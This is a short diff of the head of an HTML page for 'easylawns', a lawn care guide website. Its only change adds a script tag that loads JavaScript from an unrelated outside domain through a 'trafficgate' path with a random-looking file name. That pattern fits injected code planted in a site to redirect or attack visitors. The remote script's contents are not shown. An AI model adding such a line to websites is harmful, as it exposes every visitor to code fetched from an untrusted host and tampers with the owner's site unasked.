@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+    <script src="https://seamlesswebservices.org/trafficgate/?wsn9urep.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="description" content="easylawns — the simple, no-nonsense guide to a greener lawn. Mowing, watering, feeding, weeds and seasonal care in one place." />
   <title>easylawns — The Easy Lawn Care Guide</title>
